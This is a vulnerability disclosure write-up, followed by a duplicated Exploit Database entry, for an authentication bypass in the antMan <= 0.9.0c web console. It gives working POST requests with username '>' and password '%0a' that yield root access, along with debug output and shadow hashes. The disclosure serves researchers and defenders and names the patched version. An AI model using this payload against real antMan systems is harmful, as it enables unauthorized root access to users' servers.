### antMan Authentication Bypass

## Issue Summary

antMan versions <= 0.9.0c contain a critical authentication defect, allowing an unauthenticated attacker to obtain `root` permissions within the antMan web management console.

TL;DR - `username=>&password=%0a` == root access
## Vendor Background

[TechRepublic](https://www.techrepublic.com/article/meet-the-antsle-the-perfect-out-of-the-box-virtual-machine-solution/) describes the antsle as…

*A private cloud server, designed for developers, that can serve businesses of all sizes. With this piece of hardware, you can roll out servers, containers, you name it—all from a user-friendly web-based GUI.*

The `web-based GUI` is antMan, responsible for provisioning and maintaining your virtual servers and containers.

## Walk-through

### How antMan Authenticates

The antMan authentication implementation obtains user-supplied username and password parameters from a `POST` request issued to `/login`. Next, antMan utilizes Java’s `ProcessBuilder` class to invoke, as `root`, a bash script called `antsle-auth`.

This bash script takes in three arguments:

1. The functional action to take (`login` or `chpass`)
2. username
3. password

The flow-control of the script is to first make two `getent shadow` calls to obtain the salt and hash stored in /etc/shadow.
```
salt=$(getent shadow $username | cut -d$ -f3)
epassword=$(getent shadow $username | cut -d: -f2)

```
It then executes a python command to compute a hash based on the salt from /etc/shadow and the user-supplied password.
```
match=$(python -c 'import crypt; print crypt.crypt("'"${password}"'", "$6$'${salt}'")')

```
If the hash from /etc/shadow matches the hash computed by python, the user is authenticated as `root` to antMan. If they do not, the user is rejected.
```
if [ ${match} == ${epassword} ]
then
 echo "Password matches"
 exit 0
else
 echo "Password doesn't match"
 exit 1
fi

```
Adding some diagnostic statements into `antsle-auth`, we can see the variable assignment and computed hashes during a valid login attempt with the username `root` and the default password of `antsle`.
```
POST /login HTTP/1.1
Host: 10.1.1.7:3000
[snip]
Cookie: ring-session=67227f68-4b01-4510-b161-d3cd162ad470

username=root&password=antsle

```
```
user-supplied username: root
user-supplied password: antsle
salt from shadow: yPWFS3aj
hash from shadow: $6$yPWFS3aj$zje.YjpD0hXbhab4lxKdiGCHMVzAkXs/psEQGpFFqG7epnmFtU6ShGNu.sYhywQJmFxoQTWJIG4x7h8CUC3Si1
hash from python: $6$yPWFS3aj$zje.YjpD0hXbhab4lxKdiGCHMVzAkXs/psEQGpFFqG7epnmFtU6ShGNu.sYhywQJmFxoQTWJIG4x7h8CUC3Si1

```
In this case, we have successfully authenticated to antMan because the hash pulled from /etc/shadow matches the hash generated by python with the user-supplied password.

For the sake of completeness, here we see a login attempt with the wrong password, showing the hash mismatch and a rejected authentication attempt.
```
POST /login HTTP/1.1
Host: 10.1.1.7:3000
[snip]
Cookie: ring-session=67227f68-4b01-4510-b161-d3cd162ad470

username=root&password=not-antsle

```
```
user-supplied username: root
user-supplied password: not-antsle
salt from shadow: yPWFS3aj
hash from shadow: $6$yPWFS3aj$zje.YjpD0hXbhab4lxKdiGCHMVzAkXs/psEQGpFFqG7epnmFtU6ShGNu.sYhywQJmFxoQTWJIG4x7h8CUC3Si1
hash from python: $6$yPWFS3aj$8JOon7H.49kEe8VzaOhwFP2/ExNV0hQNRFaHYo3IHdlAlHL0vt5/qwU4OmR6GuJhz1YJNDn4OdkATRKRCpWv41

```
### Why This is Vulnerable

This implementation is flawed in that unchecked/unsanitized user input, in the form of the `username` and `password` parameters, will be passed directly to the `antsle-auth` bash script. This condition is exacerbated by the fact that there is no error handling or inspection of any return values within the `antsle-auth` script.

This matters because an attacker does not need to attempt to brute force the password or attempt a hash collision in order to pass this `if` test:
```
if [ ${match} == ${epassword} ]

```
We just need to create a condition where `match` and `epassword` are equal, regardless of what that value actually is (e.g., it doesn’t need to be a hash).

How can we force `match` and `epassword` to be equal without knowing the true `root` password? Could we get the `getent shadow` call to return an unanticipated value? Could we get the python command to fail?
### Exploitation

In order to exploit this vulnerability and gain access to antMan without a valid password, we find that if we pass in certain values for the `username` and `password` fields, we can generate return values the developer did not anticipate. In this proof of concept, we’ll force both `match` and `epassword` to return empty, allowing us to pass this `if` test and be granted access to antMan.
```
if [ ${match} == ${epassword} ]

```
First, we need to look at the `getent shadow` call.
```
salt=$(getent shadow $username | cut -d$ -f3)
epassword=$(getent shadow $username | cut -d: -f2)

```
The `getent shadow` call will return the content from /etc/shadow when a valid username is passed in as an argument.
```
root@myantsle:~ # u=root
root@myantsle:~ # getent shadow $u
root:$6$yPWFS3aj$zje.YjpD0hXbhab4lxKdiGCHMVzAkXs/psEQGpFFqG7epnmFtU6ShGNu.sYhywQJmFxoQTWJIG4x7h8CUC3Si1:17581:0:::::

```
When a "bad" character is passed in, look what happens. Nothing is returned, which we may be able to use to our advantage.
```
root@myantsle:~ # u=\>
root@myantsle:~ # getent shadow $u
root@myantsle:~ #

```
Let’s try to authenticate with a `>` in the username and see what our diagnostic statements in `antsle-auth` output.
```
POST /login HTTP/1.1
Host: 10.1.1.7:3000
[snip]
Cookie: ring-session=67227f68-4b01-4510-b161-d3cd162ad470

username=>&password=dontknow

```
```
user-supplied username: >
user-supplied password: dontknow
salt from shadow:
hash from shadow:
hash from python: $6$$Cv/81wXnKj1Rv.qnvdqGmosXNyLBBu.B9EId3IPxUSw/4J4gLYlsR/uV1tyHx7YaikDy6MP2M9Q5rdQYoyRPn0

```
Look at that. The `hash from shadow` output is empty. This means we have now made `epassword` empty. Now we just need to figure out how to get the python command to return empty so the `if` test can return `true`.

Turns out, we can pass in a URL-encoded linefeed `%0a` in the password field, which will result in the python script returning an `EOL while scanning string literal` error, which gets swallowed, resulting in `match` being empty.

Let’s try to authenticate with the username `root` and a password of `%0a` and see what our diagnostics return.
```
POST /login HTTP/1.1
Host: 10.1.1.7:3000
[snip]
Cookie: ring-session=67227f68-4b01-4510-b161-d3cd162ad470

username=root&password=%0a

```
```
user-supplied username: root
user-supplied password:
salt from shadow: yPWFS3aj
hash from shadow: $6$yPWFS3aj$zje.YjpD0hXbhab4lxKdiGCHMVzAkXs/psEQGpFFqG7epnmFtU6ShGNu.sYhywQJmFxoQTWJIG4x7h8CUC3Si1
hash from python:

```
Great! We now have python erroring out, making `match` empty.

It appears we can now force, without an actual password, the `if` test to return `true`, granting us `root` access to antMan. Let’s confirm this in antMan directly.

Setup burp and intercept the login attempt.

# Exploit Title: antMan <= 0.9.0c Authentication Bypass
# Date: 02-27-2018
# Software Link: https://www.antsle.com
# Version: <= 0.9.0c
# Tested on: 0.9.0c
# Exploit Author: Joshua Bowser
# Contact: joshua.bowser@codecatoctin.com
# Website: http://www.codecatoctin.com
# Category: web apps

1. Description

antMan versions <= 0.9.c contain a critical authentication defect, allowing an unauthenticated attacker to obtain root permissions within the antMan web management console.

http://blog.codecatoctin.com/2018/02/antman-authentication-bypass.html

2. Proof of Concept

The antMan authentication implementation obtains user-supplied username and password parameters from a POST request issued to /login. Next, antMan utilizes Javaâ€™s ProcessBuilder class to invoke, as root, a bash script called antsle-auth.

This script contains two critical defects that allow an attacker to bypass the authentication checks.  By changing the username to > and the password to a url-encoded linefeed (%0a), we can force the authentication script to produce return values not anticipated by the developer.

To exploit these defects, use a web proxy to intercept the login attempt and modify the POST parameters as follows:

#-------------------------
POST /login HTTP/1.1
Host: 10.1.1.7:3000
[snip]

username= > &password=%0a
#-------------------------

You will now be successfully authenticated to antMan as the administrative root user.

3. Solution:

Update to version 0.9.1a

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# Exploit Title: antMan <= 0.9.0c Authentication Bypass
# Date: 02-27-2018
# Software Link: https://www.antsle.com
# Version: <= 0.9.0c
# Tested on: 0.9.0c
# Exploit Author: Joshua Bowser
# Contact: joshua.bowser@codecatoctin.com
# Website: http://www.codecatoctin.com
# Category: web apps

1. Description

antMan versions <= 0.9.c contain a critical authentication defect, allowing an unauthenticated attacker to obtain root permissions within the antMan web management console.

http://blog.codecatoctin.com/2018/02/antman-authentication-bypass.html

2. Proof of Concept

The antMan authentication implementation obtains user-supplied username and password parameters from a POST request issued to /login. Next, antMan utilizes Java’s ProcessBuilder class to invoke, as root, a bash script called antsle-auth.

This script contains two critical defects that allow an attacker to bypass the authentication checks.  By changing the username to > and the password to a url-encoded linefeed (%0a), we can force the authentication script to produce return values not anticipated by the developer.

To exploit these defects, use a web proxy to intercept the login attempt and modify the POST parameters as follows:

#-------------------------
POST /login HTTP/1.1
Host: 10.1.1.7:3000
[snip]

username= > &password=%0a
#-------------------------

You will now be successfully authenticated to antMan as the administrative root user.

3. Solution:

Update to version 0.9.1a

```

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
